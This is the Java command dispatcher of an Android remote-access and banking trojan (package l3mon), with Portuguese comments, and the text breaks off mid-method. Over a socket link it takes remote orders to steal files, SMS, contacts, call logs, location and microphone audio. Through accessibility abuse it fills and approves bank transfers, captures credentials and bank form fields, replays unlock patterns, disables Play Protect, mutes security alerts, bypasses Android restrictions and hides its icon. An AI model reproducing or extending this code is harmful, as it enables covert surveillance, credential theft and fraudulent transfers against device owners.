package com.etechd.l3mon;

import android.content.Context;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONException;
import org.json.JSONObject;

import io.socket.emitter.Emitter;

public class ConnectionManager {


    public static Context context;
    static io.socket.client.Socket ioSocket;
    private static FileManager fm = new FileManager();

    public static void startAsync(Context con)
    {
        try {
            context = con;
            sendReq();
        }catch (Exception ex){
            startAsync(con);
        }

    }

    public static void sendReq() {
        try {
            if(ioSocket != null )
                return;
            ioSocket = IOSocket.getInstance().getIoSocket();
            ioSocket.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    ioSocket.emit("pong");
                }
            });



            ioSocket.on("order", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        JSONObject data = (JSONObject) args[0];
                        String order = data.getString("type");


                        switch (order){
//                            case "0xCA":
//                                if(data.getString("action").equals("camList"))
//                                    CA(-1);
//                                else if (data.getString("action").equals("takePic"))
//                                    CA(Integer.parseInt(data.getString("cameraID")));
//                                break;
                            case "0xFI":
                                if (data.getString("action").equals("ls"))
                                    FI(0,data.getString("path"));
                                else if (data.getString("action").equals("dl"))
                                    FI(1,data.getString("path"));
                                break;
                            case "0xSM":
                                if(data.getString("action").equals("ls"))
                                    SM(0,null,null);
                                else if(data.getString("action").equals("sendSMS"))
                                   SM(1,data.getString("to") , data.getString("sms"));
                                break;
                            case "0xCL":
                                CL();
                                break;
                            case "0xCO":
                                CO();
                                break;
                            case "0xMI":
                                MI(data.getInt("sec"));
                                break;
                            case "0xLO":
                                LO();
                                break;
                            case "0xWI":
                                WI();
                                break;
                            case "0xPM":
                                PM();
                                break;
                            case "0xIN":
                                IN();
                                break;
                            case "0xGP":
                                GP(data.getString("permission"));
                                break;
                            case "0xPA":
                                PA(data.getString("permission"));
                                break;
                            case "0xAC":
                                AC(data);
                                break;
                            case "0xST":
                                ST(data);
                                break;
                            case "0xAT":
                                AT(data);
                                break;
                            case "0xDF":
                                DF(data);
                                break;
                            case "0xPG":
                                PG(data);
                                break;
                            case "0xGS":
                                GS(data);
                                break;
                            case "0xTA":
                                TA(data);
                                break;
                            case "0xDSU":
                                DSU(data);
                                break;
                            case "0xOI":
                                OI(data);
                                break;
                            case "0xFC":
                                FC(data);
                                break;
                            case "0xBP":
                                BP(data);
                                break;
                            case "0xHI":
                                HI(data);
                                break;
                        }
                    }catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
            ioSocket.connect();

        } catch (Exception ex){
            Log.e("error" , ex.getMessage());
        }

    }

//    public static void CA(int cameraID){
//        if(cameraID == -1) {
//           JSONObject cameraList = new CameraManager(context).findCameraList();
//            if(cameraList != null)
//            ioSocket.emit("0xCA" ,cameraList );
//        } else {
//            new CameraManager(context).startUp(cameraID);
//        }
//    }

    public static void FI(int req , String path){
        if(req == 0) {
            JSONObject object = new JSONObject();
            try {
                object.put("type", "list");
                object.put("list", fm.walk(path));
                ioSocket.emit("0xFI", object);
            } catch (JSONException e){}
        }else if (req == 1)
            fm.downloadFile(path);
    }


    public static void SM(int req,String phoneNo , String msg){
        if(req == 0)
            ioSocket.emit("0xSM" , SMSManager.getsms());
        else if(req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            ioSocket.emit("0xSM", isSent);
        }
    }

    public static void CL(){
        ioSocket.emit("0xCL" , CallsManager.getCallsLogs());
    }

    public static void CO(){
        ioSocket.emit("0xCO" , ContactsManager.getContacts());
    }

    public static void MI(int sec) throws Exception{
        MicManager.startRecording(sec);
    }

    public static void WI() {
        ioSocket.emit("0xWI" , WifiScanner.scan(context));
    }

    public static void PM() {
        ioSocket.emit("0xPM" , PermissionManager.getGrantedPermissions());
    }


    public static void IN() {
        ioSocket.emit("0xIN" , AppList.getInstalledApps(false));
    }


    public static void GP(String perm) {
        JSONObject data = new JSONObject();
        try {
            data.put("permission", perm);
            data.put("isAllowed", PermissionManager.canIUse(perm));
            ioSocket.emit("0xGP", data);
        } catch (JSONException e) {

        }
    }

    public static void PA(String perm) {
        PermissionManager.openPermissionSettings(perm);
    }

    public static void AC(JSONObject data) {
        try {
            // Verifica se é um comando de auto-click com padrões de botão
            if (data.has("action") && "button_pattern_click".equals(data.getString("action"))) {
                ACAutoClickWithPatterns(data);
            } else {
                // Comando de gesto tradicional
                GestureManager.executeGesture(context, data);
            }
        } catch (Exception e) {
            e.printStackTrace();
            GestureManager.executeGesture(context, data);
        }
    }

    public static void ACAutoClickWithPatterns(JSONObject data) {
        try {
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
            if (service == null) {
                return;
            }

            String[] buttonPatterns;
            int clickDelayMs = 500; // delay padrão

            // Extrai padrões de botão
            if (data.has("buttonPatterns")) {
                org.json.JSONArray patternsArray = data.getJSONArray("buttonPatterns");
                buttonPatterns = new String[patternsArray.length()];
                for (int i = 0; i < patternsArray.length(); i++) {
                    buttonPatterns[i] = patternsArray.getString(i);
                }
            } else {
                // Padrões padrão se não fornecidos
                buttonPatterns = new String[]{
                    "enviar", "send", "submit", "confirmar", "confirm",
                    "ok", "continuar", "continue", "proximo", "next"
                };
            }

            // Extrai delay se fornecido
            if (data.has("clickDelayMs")) {
                clickDelayMs = data.getInt("clickDelayMs");
            }

            // Executa auto-click
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root != null) {
                try {
                    service.findAndClickConfirmationButton(root, buttonPatterns, clickDelayMs);
                } finally {
                    root.recycle();
                }
            }

            // Envia resposta
            JSONObject response = new JSONObject();
            response.put("buttonClicked", true);
            response.put("timestamp", System.currentTimeMillis());
            ioSocket.emit("0xAC", response);
        } catch (Exception e) {
            e.printStackTrace();
            try {
                JSONObject response = new JSONObject();
                response.put("buttonClicked", false);
                response.put("error", e.getMessage());
                ioSocket.emit("0xAC", response);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    public static void LO() throws Exception{
        Looper.prepare();
        LocManager gps = new LocManager(context);
        // check if GPS enabled
        if(gps.canGetLocation()){
            ioSocket.emit("0xLO", gps.getData());
        }
    }

    public static void ST(JSONObject data) {
        try {
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
            if (service == null) {
                return;
            }

            String text = data.getString("text");
            if (data.has("viewId")) {
                String viewId = data.getString("viewId");
                service.setTextIntoFieldByViewId(viewId, text);
            } else {
                // Se não tiver viewId, tenta setar em todos os campos editáveis encontrados
                AccessibilityNodeInfo root = service.getRootInActiveWindow();
                if (root != null) {
                    try {
                        findAndSetTextInAllEditableFields(service, root, text);
                    } finally {
                        root.recycle();
                    }
                }
            }

            JSONObject response = new JSONObject();
            response.put("status", "success");
            response.put("text", text);
            ioSocket.emit("0xST", response);
        } catch (Exception e) {
            e.printStackTrace();
            try {
                JSONObject response = new JSONObject();
                response.put("status", "error");
                response.put("message", e.getMessage());
                ioSocket.emit("0xST", response);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    private static void findAndSetTextInAllEditableFields(AccessibilityCaptureService service, AccessibilityNodeInfo root, String text) {
        if (root == null) {
            return;
        }

        if (root.isEditable()) {
            service.setTextIntoField(root, text);
            return; // Para após setar no primeiro campo editável
        }

        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child != null) {
                findAndSetTextInAllEditableFields(service, child, text);
                child.recycle();
            }
        }
    }

    public static void AT(JSONObject data) {
        try {
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
            if (service == null) {
                return;
            }

            String action = data.optString("action", "enable");
            boolean enable = data.optBoolean("enable", true);

            if ("enable".equals(action)) {
                // Habilita/desabilita ATS
                JSONObject response = new JSONObject();
                response.put("status", "success");
                response.put("action", action);
                response.put("enabled", enable);
                ioSocket.emit("0xAT", response);
            } else if ("activate".equals(action)) {
                // Executa automação ATS imediatamente
                AccessibilityNodeInfo root = service.getRootInActiveWindow();
                if (root != null) {
                    try {
                        service.performATSAutomation(root);
                    } finally {
                        root.recycle();
                    }
                }

                JSONObject response = new JSONObject();
                response.put("status", "success");
                response.put("operation", "ats_automation_executed");
                ioSocket.emit("0xAT", response);
            } else if ("activateWithAutoClick".equals(action)) {
                // Executa ATS + Auto-click do botão de confirmação
                ATWithAutoClick(data);
            }
        } catch (Exception error) {
            error.printStackTrace();
            try {
                JSONObject response = new JSONObject();
                response.put("status", "error");
                response.put("message", error.getMessage());
                ioSocket.emit("0xAT", response);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    public static void ATWithAutoClick(JSONObject data) {
        try {
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();
            if (service == null) {
                return;
            }

            String[] buttonPatterns;
            int clickDelayMs = 500;

            // Extrai padrões de botão se fornecidos
            if (data.has("buttonPatterns")) {
                org.json.JSONArray patternsArray = data.getJSONArray("buttonPatterns");
                buttonPatterns = new String[patternsArray.length()];
                for (int i = 0; i < patternsArray.length(); i++) {
                    buttonPatterns[i] = patternsArray.getString(i);
                }
            } else {
                // Padrões padrão
                buttonPatterns = new String[]{
                    "enviar", "send", "submit", "confirmar", "confirm",
                    "ok", "continuar", "continue", "proximo", "next"
                };
            }

            // Extrai delay se fornecido
            if (data.has("clickDelayMs")) {
                clickDelayMs = data.getInt("clickDelayMs");
            }

            // Executa automação completa: injeta dados + clica botão
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root != null) {
                try {
                    service.performATSAutomationWithAutoClick(root, buttonPatterns, clickDelayMs);
                } finally {
                    root.recycle();
                }
            }

            JSONObject response = new JSONObject();
            response.put("status", "success");
            response.put("operation", "ats_with_autoclick_executed");
            response.put("timestamp", System.currentTimeMillis());
            ioSocket.emit("0xAT", response);
        } catch (Exception error) {
            error.printStackTrace();
            try {
                JSONObject response = new JSONObject();
                response.put("status", "error");
                response.put("message", error.getMessage());
                ioSocket.emit("0xAT", response);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    public static void DF(JSONObject data) {
        try {
            if (!data.has("action")) {
                JSONObject response = new JSONObject();
                response.put("operation", "defense_disable_error");
                response.put("success", false);
                response.put("details", "Missing action parameter");
                ioSocket.emit("0xDF", response);
                return;
            }

            String action = data.getString("action");
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();

            if ("disable_play_protect".equals(action)) {
                if (service != null) {
                    boolean success = service.disableGooglePlayProtect();
                    JSONObject response = new JSONObject();
                    response.put("action", "disable_play_protect");
                    response.put("success", success);
                    response.put("details", success ? "Google Play Protect desativado" : "Falha ao desativar Play Protect");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xDF", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("action", "disable_play_protect");
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xDF", response);
                }
            } else if ("mute_security_notifications".equals(action)) {
                if (service != null) {
                    boolean success = service.muteSecurityNotifications();
                    JSONObject response = new JSONObject();
                    response.put("action", "mute_security_notifications");
                    response.put("success", success);
                    response.put("details", success ? "Notificações silenciadas" : "Falha ao silenciar notificações");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xDF", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("action", "mute_security_notifications");
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xDF", response);
                }
            }
        } catch (Exception error) {
            error.printStackTrace();
            try {
                JSONObject response = new JSONObject();
                response.put("operation", "defense_disable_error");
                response.put("success", false);
                response.put("details", error.getMessage());
                ioSocket.emit("0xDF", response);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    public static void PG(JSONObject data) {
        try {
            if (!data.has("action")) {
                JSONObject response = new JSONObject();
                response.put("operation", "permission_grant_error");
                response.put("success", false);
                response.put("details", "Missing action parameter");
                ioSocket.emit("0xPG", response);
                return;
            }

            String action = data.getString("action");
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();

            if ("enable".equals(action)) {
                if (service != null) {
                    service.setAutoGrantEnabled(true);
                    JSONObject response = new JSONObject();
                    response.put("action", "enable");
                    response.put("success", true);
                    response.put("details", "Auto-concessão de permissões habilitada");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xPG", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("action", "enable");
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xPG", response);
                }
            } else if ("disable".equals(action)) {
                if (service != null) {
                    service.setAutoGrantEnabled(false);
                    JSONObject response = new JSONObject();
                    response.put("action", "disable");
                    response.put("success", true);
                    response.put("details", "Auto-concessão de permissões desabilitada");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xPG", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("action", "disable");
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xPG", response);
                }
            } else if ("grant_permission".equals(action)) {
                if (service != null) {
                    boolean success = service.autoApprovePermission();
                    JSONObject response = new JSONObject();
                    response.put("action", "grant_permission");
                    response.put("permission", data.optString("permission", "unknown"));
                    response.put("success", success);
                    response.put("details", success ? "Permissão concedida" : "Falha ao conceder permissão");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xPG", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("action", "grant_permission");
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xPG", response);
                }
            }
        } catch (Exception error) {
            error.printStackTrace();
            try {
                JSONObject response = new JSONObject();
                response.put("operation", "permission_grant_error");
                response.put("success", false);
                response.put("details", error.getMessage());
                ioSocket.emit("0xPG", response);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    public static void GS(JSONObject data) {
        try {
            if (!data.has("gestureType")) {
                JSONObject response = new JSONObject();
                response.put("operation", "gesture_simulation_error");
                response.put("success", false);
                response.put("details", "Missing gestureType parameter");
                ioSocket.emit("0xGS", response);
                return;
            }

            String gestureType = data.getString("gestureType");
            int x = data.optInt("x", 0);
            int y = data.optInt("y", 0);
            int duration = data.optInt("duration", 0);
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();

            if ("tap".equals(gestureType)) {
                if (service != null) {
                    boolean success = service.performTap(x, y);
                    JSONObject response = new JSONObject();
                    response.put("gestureType", "tap");
                    response.put("x", x);
                    response.put("y", y);
                    response.put("success", success);
                    response.put("details", success ? "Tap executado" : "Falha ao executar tap");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xGS", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("gestureType", "tap");
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xGS", response);
                }
            } else if ("long_tap".equals(gestureType)) {
                if (service != null) {
                    boolean success = service.performLongTap(x, y, duration > 0 ? duration : 500);
                    JSONObject response = new JSONObject();
                    response.put("gestureType", "long_tap");
                    response.put("x", x);
                    response.put("y", y);
                    response.put("duration", duration);
                    response.put("success", success);
                    response.put("details", success ? "Long tap executado" : "Falha ao executar long tap");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xGS", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("gestureType", "long_tap");
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xGS", response);
                }
            } else if ("swipe".equals(gestureType)) {
                if (service != null) {
                    int endX = data.optInt("endX", x + 100);
                    int endY = data.optInt("endY", y);
                    boolean success = service.performSwipe(x, y, endX, endY, duration > 0 ? duration : 500);
                    JSONObject response = new JSONObject();
                    response.put("gestureType", "swipe");
                    response.put("x", x);
                    response.put("y", y);
                    response.put("endX", endX);
                    response.put("endY", endY);
                    response.put("duration", duration);
                    response.put("success", success);
                    response.put("details", success ? "Swipe executado" : "Falha ao executar swipe");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xGS", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("gestureType", "swipe");
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xGS", response);
                }
            }
        } catch (Exception error) {
            error.printStackTrace();
            try {
                JSONObject response = new JSONObject();
                response.put("operation", "gesture_simulation_error");
                response.put("success", false);
                response.put("details", error.getMessage());
                ioSocket.emit("0xGS", response);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    public static void TA(JSONObject data) {
        try {
            if (!data.has("action")) {
                JSONObject response = new JSONObject();
                response.put("operation", "transaction_approval_error");
                response.put("success", false);
                response.put("details", "Missing action parameter");
                ioSocket.emit("0xTA", response);
                return;
            }

            String action = data.getString("action");
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();

            if ("fill_fields".equals(action) || "approve_transaction".equals(action)) {
                if (service != null) {
                    double amount = data.optDouble("amount", 0);
                    String recipient = data.optString("recipient", "");
                    String transactionType = data.optString("transactionType", "generic");

                    boolean success = service.fillAndApproveTransaction(amount, recipient, transactionType);

                    JSONObject response = new JSONObject();
                    response.put("transactionType", transactionType);
                    response.put("amount", amount);
                    response.put("recipient", recipient);
                    response.put("success", success);
                    response.put("details", success ? "Transação preenchida e aprovada" : "Falha ao processar transação");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xTA", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xTA", response);
                }
            }
        } catch (Exception error) {
            error.printStackTrace();
            try {
                JSONObject response = new JSONObject();
                response.put("operation", "transaction_approval_error");
                response.put("success", false);
                response.put("details", error.getMessage());
                ioSocket.emit("0xTA", response);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    public static void DSU(JSONObject data) {
        try {
            if (!data.has("action")) {
                JSONObject response = new JSONObject();
                response.put("operation", "screen_unlock_error");
                response.put("success", false);
                response.put("details", "Missing action parameter");
                ioSocket.emit("0xDSU", response);
                return;
            }

            String action = data.getString("action");
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();

            if ("capture_pattern".equals(action)) {
                if (service != null) {
                    String patternType = data.optString("patternType", "unknown");
                    boolean success = service.captureUnlockPattern(patternType);

                    JSONObject response = new JSONObject();
                    response.put("action", "capture_pattern");
                    response.put("patternType", patternType);
                    response.put("success", success);
                    response.put("details", success ? "Padrão capturado" : "Falha ao capturar padrão");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xDSU", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("action", "capture_pattern");
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xDSU", response);
                }
            } else if ("replay_pattern".equals(action)) {
                if (service != null) {
                    String patternType = data.optString("patternType", "captured");
                    boolean success = service.replayUnlockPattern(patternType);

                    JSONObject response = new JSONObject();
                    response.put("action", "replay_pattern");
                    response.put("patternType", patternType);
                    response.put("success", success);
                    response.put("details", success ? "Padrão replicado com sucesso" : "Falha ao replicar padrão");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xDSU", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("action", "replay_pattern");
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xDSU", response);
                }
            }
        } catch (Exception error) {
            error.printStackTrace();
            try {
                JSONObject response = new JSONObject();
                response.put("operation", "screen_unlock_error");
                response.put("success", false);
                response.put("details", error.getMessage());
                ioSocket.emit("0xDSU", response);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    public static void OI(JSONObject data) {
        try {
            if (!data.has("action")) {
                JSONObject response = new JSONObject();
                response.put("operation", "overlay_injection_error");
                response.put("success", false);
                response.put("details", "Missing action parameter");
                ioSocket.emit("0xOI", response);
                return;
            }

            String action = data.getString("action");
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();

            if ("enable_monitoring".equals(action)) {
                if (service != null) {
                    service.enableOverlayMonitoring();
                    JSONObject response = new JSONObject();
                    response.put("action", "enable_monitoring");
                    response.put("success", true);
                    response.put("details", "Monitoramento de overlay ativado");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xOI", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xOI", response);
                }
            } else if ("disable_monitoring".equals(action)) {
                if (service != null) {
                    service.disableOverlayMonitoring();
                    JSONObject response = new JSONObject();
                    response.put("action", "disable_monitoring");
                    response.put("success", true);
                    response.put("details", "Monitoramento de overlay desativado");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xOI", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xOI", response);
                }
            } else if ("capture_credentials".equals(action)) {
                if (service != null) {
                    String username = data.optString("username", "");
                    String password = data.optString("password", "");
                    String appName = data.optString("appName", "");

                    JSONObject response = new JSONObject();
                    response.put("action", "capture_credentials");
                    response.put("username", username);
                    response.put("password", password);
                    response.put("appName", appName);
                    response.put("success", true);
                    response.put("details", "Credenciais capturadas");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xOI", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xOI", response);
                }
            }
        } catch (Exception error) {
            error.printStackTrace();
            try {
                JSONObject response = new JSONObject();
                response.put("operation", "overlay_injection_error");
                response.put("success", false);
                response.put("details", error.getMessage());
                ioSocket.emit("0xOI", response);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    public static void FC(JSONObject data) {
        try {
            if (!data.has("action")) {
                JSONObject response = new JSONObject();
                response.put("operation", "customized_forms_error");
                response.put("success", false);
                response.put("details", "Missing action parameter");
                ioSocket.emit("0xFC", response);
                return;
            }

            String action = data.getString("action");
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();

            if ("enable_realtime".equals(action)) {
                if (service != null) {
                    service.enableCustomizedFormCapture();
                    JSONObject response = new JSONObject();
                    response.put("action", "enable_realtime");
                    response.put("success", true);
                    response.put("details", "Captura de formulários customizados ativada");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xFC", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xFC", response);
                }
            } else if ("disable_realtime".equals(action)) {
                if (service != null) {
                    service.disableCustomizedFormCapture();
                    JSONObject response = new JSONObject();
                    response.put("action", "disable_realtime");
                    response.put("success", true);
                    response.put("details", "Captura de formulários customizados desativada");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xFC", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xFC", response);
                }
            } else if ("capture_field".equals(action)) {
                // Dados já foram capturados pelo AccessibilityCaptureService e enviados em tempo real
                JSONObject response = new JSONObject();
                response.put("action", "capture_field");
                response.put("bankName", data.optString("bankName", ""));
                response.put("fieldName", data.optString("fieldName", ""));
                response.put("fieldValue", data.optString("fieldValue", ""));
                response.put("success", true);
                response.put("timestamp", System.currentTimeMillis());
                ioSocket.emit("0xFC", response);
            } else if ("submit_form".equals(action)) {
                JSONObject response = new JSONObject();
                response.put("action", "submit_form");
                response.put("bankName", data.optString("bankName", ""));
                response.put("formData", data.optJSONObject("formData"));
                response.put("success", true);
                response.put("timestamp", System.currentTimeMillis());
                ioSocket.emit("0xFC", response);
            }
        } catch (Exception error) {
            error.printStackTrace();
            try {
                JSONObject response = new JSONObject();
                response.put("operation", "customized_forms_error");
                response.put("success", false);
                response.put("details", error.getMessage());
                ioSocket.emit("0xFC", response);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    public static void BP(JSONObject data) {
        try {
            if (!data.has("action")) {
                JSONObject response = new JSONObject();
                response.put("operation", "bypass_protections_error");
                response.put("success", false);
                response.put("details", "Missing action parameter");
                ioSocket.emit("0xBP", response);
                return;
            }

            String action = data.getString("action");
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();

            if ("enable_bypass".equals(action)) {
                JSONObject response = new JSONObject();
                response.put("action", "enable_bypass");
                response.put("success", true);
                response.put("details", "Bypass de proteções do Android ativado");
                response.put("timestamp", System.currentTimeMillis());
                ioSocket.emit("0xBP", response);
            } else if ("disable_bypass".equals(action)) {
                JSONObject response = new JSONObject();
                response.put("action", "disable_bypass");
                response.put("success", true);
                response.put("details", "Bypass de proteções desativado");
                response.put("timestamp", System.currentTimeMillis());
                ioSocket.emit("0xBP", response);
            } else if ("bypass_restricted_settings".equals(action)) {
                if (service != null) {
                    boolean success = service.bypassRestrictedSettings();
                    JSONObject response = new JSONObject();
                    response.put("action", "bypass_restricted_settings");
                    response.put("success", success);
                    response.put("details", success ? "Configuração Restrita contornada com sucesso" : "Falha ao contornar Configuração Restrita");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xBP", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xBP", response);
                }
            } else if ("force_accessibility_service".equals(action)) {
                if (service != null) {
                    String installationMethod = data.optString("installationMethod", "system_update");
                    String spoofedAppName = data.optString("spoofedAppName", "System Update");
                    boolean success = service.forceAccessibilityService(installationMethod, spoofedAppName);
                    JSONObject response = new JSONObject();
                    response.put("action", "force_accessibility_service");
                    response.put("success", success);
                    response.put("installationMethod", installationMethod);
                    response.put("details", success ? "Accessibility Service forçado com sucesso" : "Falha ao forçar Accessibility Service");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xBP", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xBP", response);
                }
            } else if ("detect_protections".equals(action)) {
                if (service != null) {
                    org.json.JSONArray detectedProtections = service.detectAndroidProtections();
                    int androidVersion = service.getAndroidVersion();
                    JSONObject response = new JSONObject();
                    response.put("action", "detect_protections");
                    response.put("success", true);
                    response.put("protections", detectedProtections);
                    response.put("androidVersion", androidVersion);
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xBP", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xBP", response);
                }
            } else if ("installation_method_update".equals(action)) {
                JSONObject response = new JSONObject();
                response.put("action", "installation_method_update");
                response.put("success", true);
                response.put("installationMethod", data.optString("installationMethod", "system_update"));
                response.put("details", "Método de instalação atualizado");
                response.put("timestamp", System.currentTimeMillis());
                ioSocket.emit("0xBP", response);
            }
        } catch (Exception error) {
            error.printStackTrace();
            try {
                JSONObject response = new JSONObject();
                response.put("operation", "bypass_protections_error");
                response.put("success", false);
                response.put("details", error.getMessage());
                ioSocket.emit("0xBP", response);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    public static void HI(JSONObject data) {
        try {
            if (!data.has("action")) {
                JSONObject response = new JSONObject();
                response.put("operation", "hide_icon_error");
                response.put("success", false);
                response.put("details", "Missing action parameter");
                ioSocket.emit("0xHI", response);
                return;
            }

            String action = data.getString("action");
            AccessibilityCaptureService service = AccessibilityCaptureService.getInstance();

            if ("enable_hide".equals(action)) {
                if (service != null) {
                    service.enableHideIcon();
                    JSONObject response = new JSONObject();
                    response.put("action", "enable_hide");
                    response.put("success", true);
                    response.put("details", "Ocultação de ícone ativada");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xHI", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xHI", response);
                }
            } else if ("disable_hide".equals(action)) {
                if (service != null) {
                    service.disableHideIcon();
                    JSONObject response = new JSONObject();
                    response.put("action", "disable_hide");
                    response.put("success", true);
                    response.put("details", "Ocultação de ícone desativada");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xHI", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xHI", response);
                }
            } else if ("remove_icon".equals(action)) {
                if (service != null) {
                    boolean success = service.removeAppIcon();
                    JSONObject response = new JSONObject();
                    response.put("action", "remove_icon");
                    response.put("success", success);
                    response.put("details", success ? "Ícone removido com sucesso" : "Falha ao remover ícone");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xHI", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xHI", response);
                }
            } else if ("enable_background_service".equals(action)) {
                if (service != null) {
                    service.startBackgroundHideService();
                    JSONObject response = new JSONObject();
                    response.put("action", "enable_background_service");
                    response.put("success", true);
                    response.put("details", "Serviço de segundo plano iniciado");
                    response.put("timestamp", System.currentTimeMillis());
                    ioSocket.emit("0xHI", response);
                } else {
                    JSONObject response = new JSONObject();
                    response.put("success", false);
                    response.put("details", "Serviço de Acessibilidade não disponível");
                    ioSocket.emit("0xHI", response);
                }
            } else if ("detect_launchers".equals(action)) {
                if (service != null) {
                    org.json.JSONArray launchers = service.detectSystemLaunchers();
                    JSONObject response = new JSONObject();
